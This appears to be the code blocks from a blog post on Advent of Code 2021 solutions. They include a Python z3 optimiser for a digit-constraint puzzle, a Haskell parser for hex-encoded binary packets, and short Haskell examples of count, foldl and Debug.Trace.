s <span class="token operator">=</span> z3<span class="token punctuation">.</span>Optimize<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Constrain input to non-zero digits.</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">&lt;=</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> inp<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">[</span>i <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> inp<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Chain constraints. Each iteration will have a separate z variable.</span>
<span class="token comment"># The constraints added will connect z[i+1] to z[i].</span>
zs <span class="token operator">=</span> <span class="token punctuation">[</span>z3<span class="token punctuation">.</span>Int<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'z_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>zs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> inp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>zs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> addx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>zs<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> z3<span class="token punctuation">.</span>If<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span>zs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> divz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">26</span> <span class="token operator">+</span> inp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> addy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>
                              zs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> divz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>zs<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># Victory constraint.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Construct full input to optimise (with place value).</span>
full_inp <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> acc<span class="token punctuation">,</span> x<span class="token punctuation">:</span> acc<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> x<span class="token punctuation">,</span> inp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_inp</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>model<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> inp<span class="token punctuation">)</span>

<span class="token comment"># Part 1.</span>
s<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>maximize<span class="token punctuation">(</span>full_inp<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>
part1 <span class="token operator">=</span> get_inp<span class="token punctuation">(</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'part1:'</span><span class="token punctuation">,</span> part1<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Part 2.</span>
s<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>full_inp<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>
part2 <span class="token operator">=</span> get_inp<span class="token punctuation">(</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'part2:'</span><span class="token punctuation">,</span> part2<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">D2FE28</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">110100101111111000101000</code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">parse</span> <span class="token operator">::</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">Packet</span>
<span class="token hvariable">parse</span> <span class="token operator">=</span> <span class="token hvariable">subparse</span> <span class="token hvariable">packet</span> <span class="token operator">.</span> <span class="token builtin">concatMap</span> <span class="token punctuation">(</span><span class="token operator">\</span><span class="token hvariable">hex</span> <span class="token operator">-&gt;</span> <span class="token builtin">read</span> <span class="token operator">$</span> <span class="token hvariable">toBinary</span> <span class="token operator">$</span> <span class="token string">"0x"</span> <span class="token operator">++</span> <span class="token punctuation">[</span><span class="token hvariable">hex</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 <span class="token keyword">where</span>
  <span class="token hvariable">toBinary</span> <span class="token hvariable">n</span> <span class="token operator">=</span> <span class="token hvariable">printf</span> <span class="token string">"%04s"</span> <span class="token punctuation">(</span><span class="token hvariable">showIntAtBase</span> <span class="token number">2</span> <span class="token punctuation">(</span><span class="token string">"01"</span> <span class="token operator">!!</span><span class="token punctuation">)</span> <span class="token hvariable">n</span> <span class="token string">""</span><span class="token punctuation">)</span>

<span class="token hvariable">subparse</span> <span class="token operator">::</span> <span class="token constant">Parser</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span>
<span class="token hvariable">subparse</span> <span class="token hvariable">p</span> <span class="token hvariable">s</span> <span class="token operator">=</span> <span class="token keyword">case</span> <span class="token hvariable">runParser</span> <span class="token punctuation">(</span><span class="token hvariable">p</span> <span class="token operator">&lt;*</span> <span class="token hvariable">many</span> <span class="token punctuation">(</span><span class="token hvariable">char</span> <span class="token char string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">""</span> <span class="token hvariable">s</span> <span class="token keyword">of</span>
  <span class="token constant">Right</span> <span class="token hvariable">res</span> <span class="token operator">-&gt;</span> <span class="token hvariable">res</span>
  <span class="token constant">Left</span>  <span class="token hvariable">err</span> <span class="token operator">-&gt;</span> <span class="token hvariable">trace</span> <span class="token punctuation">(</span><span class="token hvariable">errorBundlePretty</span> <span class="token hvariable">err</span><span class="token punctuation">)</span> <span class="token builtin">undefined</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Packet</span> <span class="token operator">=</span> <span class="token constant">Packet</span> <span class="token constant">Int</span> <span class="token constant">Int</span> <span class="token constant">PacketObj</span> <span class="token keyword">deriving</span> <span class="token constant">Show</span>
<span class="token keyword">data</span> <span class="token constant">PacketObj</span> <span class="token operator">=</span> <span class="token constant">Literal</span> <span class="token constant">Int</span> <span class="token operator">|</span> <span class="token constant">Operands</span> <span class="token punctuation">[</span><span class="token constant">Packet</span><span class="token punctuation">]</span> <span class="token keyword">deriving</span> <span class="token constant">Show</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">bits</span> <span class="token operator">::</span> <span class="token constant">Int</span> <span class="token operator">-&gt;</span> <span class="token constant">Parser</span> <span class="token constant">String</span>
<span class="token hvariable">bits</span> <span class="token hvariable">n</span> <span class="token operator">=</span> <span class="token hvariable">count</span> <span class="token hvariable">n</span> <span class="token hvariable">digitChar</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">fromBinary</span> <span class="token operator">::</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">fromBinary</span> <span class="token operator">=</span> <span class="token builtin">foldl</span>' <span class="token punctuation">(</span><span class="token operator">\</span><span class="token hvariable">acc</span> <span class="token hvariable">d</span> <span class="token operator">-&gt;</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token hvariable">acc</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token hvariable">d</span><span class="token punctuation">)</span> <span class="token number">0</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">packet</span> <span class="token operator">::</span> <span class="token constant">Parser</span> <span class="token constant">Packet</span>
<span class="token hvariable">packet</span> <span class="token operator">=</span> <span class="token keyword">do</span>
  <span class="token hvariable">version</span> <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">3</span>
  <span class="token hvariable">typeID</span>  <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">3</span>
  <span class="token keyword">if</span> <span class="token hvariable">typeID</span> <span class="token operator">==</span> <span class="token number">4</span>
    <span class="token keyword">then</span> <span class="token keyword">do</span>
      <span class="token hvariable">bs</span> <span class="token operator">&lt;-</span> <span class="token hvariable">collectWhile</span> <span class="token punctuation">(</span><span class="token hvariable">bits</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">$</span> <span class="token operator">\</span><span class="token punctuation">(</span><span class="token hvariable">b</span> <span class="token operator">:</span> <span class="token hvariable">_</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token hvariable">b</span> <span class="token operator">==</span> <span class="token char string">'1'</span>
      <span class="token builtin">return</span> <span class="token operator">$</span> <span class="token constant">Packet</span> <span class="token hvariable">version</span> <span class="token hvariable">typeID</span> <span class="token operator">$</span> <span class="token constant">Literal</span> <span class="token operator">$</span> <span class="token hvariable">fromBinary</span> <span class="token operator">$</span> <span class="token builtin">concatMap</span> <span class="token punctuation">(</span><span class="token builtin">drop</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token hvariable">bs</span>
    <span class="token keyword">else</span> <span class="token keyword">do</span>
      <span class="token comment">{- -- code for operand packets --  -}</span>
 <span class="token keyword">where</span>
  <span class="token hvariable">collectWhile</span> <span class="token hvariable">p</span> <span class="token hvariable">f</span> <span class="token operator">=</span> <span class="token keyword">do</span> <span class="token comment">-- Parse while condition is true.</span>
    <span class="token hvariable">x</span> <span class="token operator">&lt;-</span> <span class="token hvariable">p</span>
    <span class="token keyword">if</span> <span class="token hvariable">f</span> <span class="token hvariable">x</span> <span class="token keyword">then</span> <span class="token punctuation">(</span><span class="token hvariable">x</span> <span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">collectWhile</span> <span class="token hvariable">p</span> <span class="token hvariable">f</span> <span class="token keyword">else</span> <span class="token builtin">return</span> <span class="token punctuation">[</span><span class="token hvariable">x</span><span class="token punctuation">]</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">operands</span> <span class="token operator">::</span> <span class="token constant">Int</span> <span class="token operator">-&gt;</span> <span class="token constant">Parser</span> <span class="token punctuation">[</span><span class="token constant">Packet</span><span class="token punctuation">]</span>
<span class="token hvariable">operands</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token keyword">do</span>  <span class="token comment">-- Length type ID == 0 ---&gt; length-based operand</span>
  <span class="token hvariable">len</span>      <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">15</span>
  <span class="token hvariable">subparse</span> <span class="token punctuation">(</span><span class="token hvariable">some</span> <span class="token hvariable">packet</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token hvariable">len</span>
<span class="token hvariable">operands</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token keyword">do</span>  <span class="token comment">-- Length type ID == 1 ---&gt; count-based operand</span>
  <span class="token hvariable">num</span>      <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">11</span>
  <span class="token hvariable">count</span> <span class="token hvariable">num</span> <span class="token hvariable">packet</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">packet</span> <span class="token operator">::</span> <span class="token constant">Parser</span> <span class="token constant">Packet</span>
<span class="token hvariable">packet</span> <span class="token operator">=</span> <span class="token keyword">do</span>
  <span class="token hvariable">version</span> <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">3</span>
  <span class="token hvariable">typeID</span>  <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">3</span>
  <span class="token keyword">if</span> <span class="token hvariable">typeID</span> <span class="token operator">==</span> <span class="token number">4</span>
    <span class="token keyword">then</span> <span class="token keyword">do</span>
      <span class="token comment">{- -- code for literal packets --  -}</span>
    <span class="token keyword">else</span> <span class="token keyword">do</span> <span class="token comment">-- Code for operands.</span>
      <span class="token hvariable">lenTypeID</span> <span class="token operator">&lt;-</span> <span class="token hvariable">fromBinary</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">bits</span> <span class="token number">1</span>
      <span class="token hvariable">children</span>  <span class="token operator">&lt;-</span> <span class="token hvariable">operands</span> <span class="token hvariable">lenTypeID</span>
      <span class="token builtin">return</span> <span class="token operator">$</span> <span class="token constant">Packet</span> <span class="token hvariable">version</span> <span class="token hvariable">typeID</span> <span class="token operator">$</span> <span class="token constant">Operands</span> <span class="token hvariable">children</span>
 <span class="token keyword">where</span>
    <span class="token operator">...</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">part1</span> <span class="token operator">::</span> <span class="token constant">Packet</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part1</span> <span class="token punctuation">(</span><span class="token constant">Packet</span> <span class="token hvariable">v</span> <span class="token hvariable">_</span> <span class="token hvariable">obj</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">case</span> <span class="token hvariable">obj</span> <span class="token keyword">of</span>
  <span class="token constant">Literal</span> <span class="token hvariable">_</span> <span class="token operator">-&gt;</span> <span class="token hvariable">v</span>
  <span class="token constant">Operands</span> <span class="token hvariable">ps</span> <span class="token operator">-&gt;</span> <span class="token hvariable">v</span> <span class="token operator">+</span> <span class="token builtin">sum</span> <span class="token punctuation">(</span><span class="token builtin">map</span> <span class="token hvariable">part1</span> <span class="token hvariable">ps</span><span class="token punctuation">)</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">part2</span> <span class="token operator">::</span> <span class="token constant">Packet</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part2</span> <span class="token punctuation">(</span><span class="token constant">Packet</span> <span class="token hvariable">_</span> <span class="token hvariable">op</span> <span class="token hvariable">obj</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">case</span> <span class="token hvariable">obj</span> <span class="token keyword">of</span>
  <span class="token constant">Literal</span> <span class="token hvariable">x</span> <span class="token operator">-&gt;</span> <span class="token hvariable">x</span>
  <span class="token constant">Operands</span> <span class="token hvariable">ps</span> <span class="token operator">-&gt;</span> <span class="token keyword">case</span> <span class="token hvariable">op</span> <span class="token keyword">of</span>
      <span class="token number">0</span> <span class="token operator">-&gt;</span> <span class="token builtin">sum</span>
      <span class="token number">1</span> <span class="token operator">-&gt;</span> <span class="token builtin">product</span>
      <span class="token number">2</span> <span class="token operator">-&gt;</span> <span class="token builtin">minimum</span>
      <span class="token number">3</span> <span class="token operator">-&gt;</span> <span class="token builtin">maximum</span>
      <span class="token number">5</span> <span class="token operator">-&gt;</span> <span class="token operator">\</span><span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">,</span> <span class="token hvariable">b</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token keyword">if</span> <span class="token hvariable">a</span> <span class="token operator">&gt;</span> <span class="token hvariable">b</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
      <span class="token number">6</span> <span class="token operator">-&gt;</span> <span class="token operator">\</span><span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">,</span> <span class="token hvariable">b</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token keyword">if</span> <span class="token hvariable">a</span> <span class="token operator">&lt;</span> <span class="token hvariable">b</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
      <span class="token number">7</span> <span class="token operator">-&gt;</span> <span class="token operator">\</span><span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">,</span> <span class="token hvariable">b</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token keyword">if</span> <span class="token hvariable">a</span> <span class="token operator">==</span> <span class="token hvariable">b</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
    <span class="token operator">$</span> <span class="token builtin">map</span> <span class="token hvariable">part2</span> <span class="token hvariable">ps</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">count</span> <span class="token hvariable">p</span> <span class="token hvariable">xs</span> <span class="token operator">=</span> <span class="token builtin">length</span> <span class="token punctuation">(</span><span class="token builtin">filter</span> <span class="token hvariable">p</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span>
<span class="token keyword">int32_t</span> <span class="token function">count</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token operator">&gt;</span> p<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>list<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span> <span class="token keyword">const</span><span class="token operator">&amp;</span> xs<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">def</span> count<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">(</span>p<span class="token operator">:</span> A <span class="token keyword">=&gt;</span> <span class="token builtin">Boolean</span><span class="token punctuation">,</span> xs<span class="token operator">:</span> List<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">count</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Bool</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">count</span> <span class="token hvariable">p</span> <span class="token operator">=</span> <span class="token builtin">length</span> <span class="token operator">.</span> <span class="token builtin">filter</span> <span class="token hvariable">p</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">count</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Bool</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">firstBy</span> <span class="token hvariable">p</span> <span class="token operator">=</span> <span class="token builtin">head</span> <span class="token operator">.</span> <span class="token builtin">filter</span> <span class="token hvariable">p</span>
<span class="token hvariable">lastBy</span> <span class="token hvariable">p</span> <span class="token operator">=</span> <span class="token builtin">last</span> <span class="token operator">.</span> <span class="token builtin">filter</span> <span class="token hvariable">p</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">firstBy</span> <span class="token builtin">even</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">..</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token number">2</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">lastBy</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">..</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token number">3</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">fromBinary</span> <span class="token operator">=</span> <span class="token builtin">foldl</span> <span class="token punctuation">(</span><span class="token operator">\</span><span class="token hvariable">acc</span> <span class="token hvariable">d</span> <span class="token operator">-&gt;</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token hvariable">acc</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token hvariable">d</span><span class="token punctuation">)</span> <span class="token number">0</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">fromBinary</span> <span class="token string">"10"</span> 
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'0'</span>
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'0'</span>
    <span class="token operator">=</span> <span class="token number">2</span>

<span class="token hvariable">fromBinary</span> <span class="token string">"1011"</span> 
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span>
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span>
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span>
    <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">digitToInt</span> <span class="token char string">'1'</span>
    <span class="token operator">=</span> <span class="token number">11</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">hello</span> <span class="token operator">::</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span>
<span class="token hvariable">hello</span> <span class="token hvariable">x</span> <span class="token operator">=</span> <span class="token hvariable">trace</span> <span class="token string">"trace says 'hello'"</span> <span class="token hvariable">x</span>

<span class="token hvariable">foo</span> <span class="token operator">::</span> <span class="token constant">Int</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">foo</span> <span class="token hvariable">n</span> <span class="token hvariable">s</span> <span class="token operator">|</span> <span class="token hvariable">trace</span> <span class="token punctuation">(</span><span class="token string">"int: "</span> <span class="token operator">++</span> <span class="token builtin">show</span> <span class="token hvariable">n</span> <span class="token operator">++</span> <span class="token string">";  string: "</span> <span class="token operator">++</span> <span class="token hvariable">s</span><span class="token punctuation">)</span> <span class="token constant">False</span> <span class="token operator">=</span> <span class="token builtin">undefined</span>
<span class="token hvariable">foo</span> <span class="token hvariable">n</span> <span class="token hvariable">s</span> <span class="token operator">=</span> <span class="token hvariable">n</span> <span class="token operator">+</span> <span class="token builtin">length</span> <span class="token hvariable">s</span>

<span class="token comment">--</span>

<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">hello</span> <span class="token string">"world"</span>
<span class="token hvariable">trace</span> <span class="token hvariable">says</span> '<span class="token hvariable">hello'</span>
<span class="token hvariable">world</span>

<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">foo</span> <span class="token number">1</span> <span class="token string">"abc"</span>
<span class="token hvariable">int</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token hvariable">string</span><span class="token operator">:</span> <span class="token hvariable">abc</span>
<span class="token number">4</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token punctuation">(</span><span class="token operator">++$</span><span class="token punctuation">)</span> <span class="token hvariable">s</span> <span class="token hvariable">x</span> <span class="token operator">=</span> <span class="token hvariable">s</span> <span class="token operator">++</span> <span class="token string">" "</span> <span class="token operator">++</span> <span class="token builtin">show</span> <span class="token hvariable">x</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">foo</span> <span class="token operator">::</span> <span class="token constant">Int</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">foo</span> <span class="token hvariable">n</span> <span class="token hvariable">s</span> <span class="token operator">|</span> <span class="token hvariable">trace</span> <span class="token punctuation">(</span><span class="token string">"int:"</span> <span class="token operator">++$</span> <span class="token hvariable">n</span> <span class="token operator">++</span> <span class="token string">";  string: "</span> <span class="token operator">++</span> <span class="token hvariable">s</span><span class="token punctuation">)</span> <span class="token constant">False</span> <span class="token operator">=</span> <span class="token builtin">undefined</span>
<span class="token hvariable">foo</span> <span class="token hvariable">n</span> <span class="token hvariable">s</span> <span class="token operator">=</span> <span class="token hvariable">n</span> <span class="token operator">+</span> <span class="token builtin">length</span> <span class="token hvariable">s</span></code></pre>
